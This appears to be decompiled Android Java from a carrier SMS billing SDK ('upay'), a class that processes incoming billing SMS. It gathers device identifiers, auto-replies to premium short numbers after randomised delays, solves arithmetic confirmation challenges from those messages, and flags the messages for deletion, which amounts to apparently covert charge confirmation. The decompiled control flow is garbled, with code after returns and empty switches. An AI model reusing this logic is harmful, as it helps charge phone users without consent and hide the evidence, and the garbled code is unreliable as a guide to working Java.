package com.upay.billing.engine.upay;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.SharedPreferences;
import android.util.Log;
import com.upay.billing.MtContext;
import com.upay.billing.UpayConstant;
import com.upay.billing.UpayContext;
import com.upay.billing.UpayCore;
import com.upay.billing.bean.Cmd;
import com.upay.billing.bean.Op;
import com.upay.billing.bean.Trade;
import com.upay.billing.engine.CommonEngine;
import com.upay.billing.utils.Json;
import com.upay.billing.utils.Util;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.Iterator;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Random;

public class Main
  extends CommonEngine
{
  private static final int Analyze_Action_Fail = 131;
  private static final String SAVE_NAME = "com.upay.billing.saveddata.Main";
  private static final String TAG = "UpayEngine";
  private static final String dtsmsUrl = UpayConstant.API_BASE_URL + "plan/dyncode";
  private List sendFail;
  private List sendSucc;
  private ArrayList tradeList;
  
  public Main() {}
  
  private int getCmdType(String paramString)
  {
    Object localObject1 = this.core.getContext().getSharedPreferences("com.upay.billing.saveddata.Main", 0).getString("cmdType", null);
    if (localObject1 != null) {
      try
      {
        localObject1 = (HashMap)Util.unserialize((String)localObject1);
      }
      catch (Exception localException)
      {
        for (;;)
        {
          try
          {
            int i = ((Integer)((HashMap)localObject1).get(paramString)).intValue();
            return i;
          }
          catch (Exception paramString) {}
          localException = localException;
          Object localObject2 = null;
        }
      }
    } else {
      return 0;
    }
    return 0;
  }
  
  private Json getParams(Trade paramTrade)
  {
    Json localJson = Json.parse("{}");
    localJson.put("imei", this.core.getUpayContext().imei);
    localJson.put("imsi", this.core.getUpayContext().imsi);
    localJson.put("iccid", this.core.getUpayContext().iccid);
    localJson.put("user_id", Long.valueOf(paramTrade.uid));
    localJson.put("package_name", this.core.getContext().getPackageName());
    return localJson;
  }
  
  public static int getRandom(int paramInt1, int paramInt2)
  {
    return new Random().nextInt(paramInt2) % (paramInt2 - paramInt1 + 1) + paramInt1;
  }
  
  private String time()
  {
    return Util.formatDate("yyyyMMddHHmmss", new Date(Util.getTs() + Util.getLong(this.core.getContext(), "Time-Diff")));
  }
  
  public String getMonitorNum()
  {
    String[] arrayOfString = this.core.getPropString("upay", "monitor_num", "").split("&");
    return arrayOfString[getRandom(0, arrayOfString.length - 1)];
  }
  
  public Op getOp()
  {
    switch (this.key.charAt(4))
    {
    default: 
      throw new IllegalStateException();
    case 'c': 
      return Op.CMCC;
    case 'u': 
      return Op.UNICOM;
    }
    return Op.TELECOM;
  }
  
  public boolean hasCustomConfirmUi()
  {
    return false;
  }
  
  public boolean isAvailable(Op paramOp, boolean paramBoolean1, boolean paramBoolean2, boolean paramBoolean3, boolean paramBoolean4)
  {
    return paramBoolean1;
  }
  
  public boolean isComposable()
  {
    return true;
  }
  
  @SuppressLint({"DefaultLocale"})
  public int onMtAction(MtContext paramMtContext, Json paramJson, String paramString1, String paramString2, String[] paramArrayOfString)
  {
    Log.i("UpayEngine", "onMtAction: exec=" + paramJson.asObject() + ",mtNum=" + paramString1 + ",mtMsg=" + paramString2);
    Context localContext = this.core.getContext();
    Object localObject1 = paramMtContext.trade;
    Object localObject2 = paramMtContext.cmd;
    Json localJson = ((Trade)localObject1).getSubTrade(((Cmd)localObject2).key);
    String str1 = ((Trade)localObject1).appKey;
    Object localObject3 = ((Trade)localObject1).id;
    String str2 = ((Trade)localObject1).goodsKey;
    String str3 = ((Cmd)localObject2).key;
    String str4 = ((Cmd)localObject2).btKey;
    if (((Cmd)localObject2).deleteMt) {}
    for (int i = 1;; i = 0)
    {
      paramString2 = Json.createObject(new Object[] { "trade_id", localObject3, "goods_key", str2, "cmd_key", str3, "bt_key", str4, "delete_mt", Integer.valueOf(i), "description", "", "mt_msg", paramString2, "mt_num", paramString1, "result", Integer.valueOf(200), "sn", paramMtContext.serialNo, "up_msg", "", "up_num", "" });
      localObject3 = Json.createObject(new Object[] { "trade_id", ((Trade)localObject1).id, "goods_key", ((Trade)localObject1).goodsKey, "cmd_key", ((Cmd)localObject2).key, "bt_key", ((Cmd)localObject2).btKey, "description", "upay", "mt_msg", "", "mt_num", "", "sn", paramMtContext.serialNo });
      switch (Main.5.$SwitchMap$com$upay$billing$engine$upay$Main$ExecType[Main.ExecType.valueOf(paramJson.getStr("type").toUpperCase()).ordinal()])
      {
      default: 
        return 0;
      }
    }
    if ((localJson.getInt("state") & 0x4) != 0) {
      return 524288;
    }
    paramString1 = paramJson.getStr("num", "$mt_num").replace("$mt_num", paramString1);
    if (Util.empty(paramJson.getStr("mode"))) {}
    for (paramJson = paramJson.getStr("msg").replace("$last_mo_msg", paramMtContext.moMsg);; paramJson = paramJson.getStr("msg").replace("$last_mo_msg", (CharSequence)localObject2))
    {
      i = paramArrayOfString.length;
      for (;;)
      {
        i -= 1;
        if (i < 0) {
          break;
        }
        paramJson = paramJson.replace("$" + (i + 1), paramArrayOfString[i]).replace("$uid", String.valueOf(((Trade)localObject1).uid)).replace("$serialNo", paramMtContext.serialNo);
      }
      localObject2 = paramMtContext.moMsg.substring(0, paramMtContext.moMsg.indexOf("#"));
    }
    paramMtContext = new int[120];
    paramArrayOfString = this.core.getPropString("upay", "mp_delay_reply_tag", "0");
    localObject1 = this.core.getPropString("upay", "mp_reply_num", "1065889920001");
    localObject2 = this.core.getPropString("upay", "sw_reply_num", "106588995604");
    long l;
    if (("1".equals(paramArrayOfString)) && ((((String)localObject1).equals(paramString1)) || (((String)localObject2).equals(paramString1)))) {
      l = getRandom(6, 8) * 1000;
    }
    try
    {
      Thread.sleep(l);
      Util.getTs();
      new Main.2(this, localContext, paramString1, paramJson, "", paramMtContext, localJson, str1, paramString2).run();
      return 524288;
      if ((localJson.getInt("state") & 0x4) != 0) {
        return 524288;
      }
      str2 = paramJson.getStr("num", "$mt_num").replace("$mt_num", paramString1);
      if (Util.empty(paramJson.getStr("mode"))) {}
      for (paramString1 = paramJson.getStr("msg").replace("$last_mo_msg", paramMtContext.moMsg);; paramString1 = paramJson.getStr("msg").replace("$last_mo_msg", paramString1))
      {
        i = paramArrayOfString.length;
        for (;;)
        {
          i -= 1;
          if (i < 0) {
            break;
          }
          paramString1 = paramString1.replace("$" + (i + 1), paramArrayOfString[i]).replace("$uid", String.valueOf(((Trade)localObject1).uid)).replace("$serialNo", paramMtContext.serialNo);
        }
        paramString1 = paramMtContext.moMsg.substring(0, paramMtContext.moMsg.indexOf("#"));
      }
      paramArrayOfString = new int[120];
      str3 = this.core.getPropString("upay", "mp_delay_reply_tag", "0");
      str4 = this.core.getPropString("upay", "mp_reply_num", "1065889920001");
      String str5 = this.core.getPropString("upay", "sw_reply_num", "106588995604");
      if (("1".equals(str3)) && ((str4.equals(str2)) || (str5.equals(str2)))) {
        l = getRandom(6, 8) * 1000;
      }
    }
    catch (InterruptedException paramArrayOfString)
    {
      try
      {
        Thread.sleep(l);
        new Main.3(this, localContext, str2, paramString1, "", paramArrayOfString, localJson, str1, paramString2, (Trade)localObject1, paramMtContext, paramJson, (Json)localObject3, (Cmd)localObject2).run();
        return 524288;
        if ((localJson.getInt("state") & 0x4) != 0) {
          return 524288;
        }
        paramString1 = paramJson.getStr("num", "$mt_num").replace("$mt_num", paramString1);
        paramJson = paramJson.getStr("msg", "$1,$2,$3").split(",");
        i = Integer.parseInt(paramJson[0]);
        int j = Integer.parseInt(paramJson[2]);
        paramMtContext = "";
        switch ("+-*/".indexOf(paramJson[1]))
        {
        }
        for (;;)
        {
          new Main.4(this, localContext, paramString1, paramMtContext, "", localJson, str1, paramString2).run();
          return 524288;
          paramMtContext = Integer.toString(i + j);
          continue;
          paramMtContext = Integer.toString(i - j);
          continue;
          paramMtContext = Integer.toString(i * j);
          continue;
          paramMtContext = Integer.toString(i / j);
        }
        return 524288;
        return 65736;
        return 0x10000 | paramJson.getInt("code");
        paramArrayOfString = paramArrayOfString;
      }
      catch (InterruptedException localInterruptedException)
      {
        for (;;) {}
      }
    }
  }
  
  public void pay(Trade paramTrade, List paramList)
  {
    LinkedHashMap localLinkedHashMap1 = new LinkedHashMap();
    LinkedHashMap localLinkedHashMap2 = new LinkedHashMap();
    LinkedHashMap localLinkedHashMap3 = new LinkedHashMap();
    this.sendSucc = new ArrayList();
    this.sendFail = new ArrayList();
    this.tradeList = new ArrayList();
    Iterator localIterator1 = Util.safeIter(paramTrade.subTrades).iterator();
    Json localJson;
    String str;
    Cmd localCmd;
    if (localIterator1.hasNext())
    {
      localJson = (Json)localIterator1.next();
      str = localJson.getStr("sn");
      Iterator localIterator2 = paramList.iterator();
      do
      {
        if (!localIterator2.hasNext()) {
          break;
        }
        localCmd = (Cmd)localIterator2.next();
      } while (!localCmd.key.equals(localJson.getStr("cmd_key")));
    }
    for (;;)
    {
      if (localCmd.btKey.contains("upay"))
      {
        localLinkedHashMap1.put(str, localCmd);
        break;
      }
      localJson = Json.parse("{}");
      localJson.put("sn", str);
      localJson.put("cmd_key", localCmd.key);
      this.tradeList.add(localJson);
      localLinkedHashMap1.put(str, localCmd);
      localLinkedHashMap2.put(str, localCmd);
      break;
      new Thread(new Main.1(this, paramTrade, localLinkedHashMap3, localLinkedHashMap2, localLinkedHashMap1)).start();
      return;
      localCmd = null;
    }
  }
}
